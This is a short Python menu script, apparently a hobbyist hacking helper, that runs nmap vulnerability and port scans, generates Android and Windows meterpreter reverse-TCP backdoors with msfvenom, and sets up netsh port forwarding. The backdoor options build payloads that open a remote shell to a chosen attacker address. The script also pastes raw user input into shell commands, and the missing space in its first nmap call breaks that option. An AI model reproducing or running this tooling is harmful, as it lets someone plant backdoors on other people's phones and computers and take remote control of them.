import os


print ('Type 1 For use Vuln find')
print ('Type 2 force scan')
print ('TYPE 3 top-ports')
print ('TYPE 4 -Pn')
print ('TYPE 5 Create AndRoid Backdoor')
print ('TYPE 6 Create Windows Backdoor')
print ('TYPE 7 farward to vmware or wsl (This option need to admin Access)')
print ('TYPE 8 show routes')


start_over = 'scaning'

scan  = input("type options  ")


if scan == "1":
    print(start_over)
    hostname = input('enter ip ')
    os.system("nmap   --script=vuln"  + hostname) 

elif  scan == "2":
    os.system("nmap -A -sV -O    "  + input('ip ')) 
    
elif  scan == "3":
    os.system("nmap --top-ports 20 "  + input('ip ')) 

elif  scan == "4":
    os.system("nmap -Pn "  + input('ip')) 
elif  scan == "5":
    hostname = input('ip ')
    
    os.system("msfvenom -p  android/meterpreter/reverse_tcp LHOST="  + hostname + " LPORT="+input('port no ') + "  -o "+ input('Enter Backdoor Name  ')) 
elif  scan == "6":
    hostname = input('ip ')
    
    os.system("msfvenom -p  windows/x64/meterpreter/reverse_tcp LHOST="  + hostname + " LPORT="+input('port no ') + "  -o "+ input('Enter Backdoor Name  ')) 
        
elif  scan == "7":
    hostname = input('port no ')
    
    os.system("netsh interface portproxy add v4tov4 listenport=" + hostname + " listenaddress=0.0.0.0 connectport=" + hostname + " connectaddress=" + input('ip') )
        
elif  scan == "8":
    
    
    os.system("netsh interface portproxy show v4tov4" )
        
else:
    print("\n\n  Sorry Don't Understand")
    
    
    
    
    
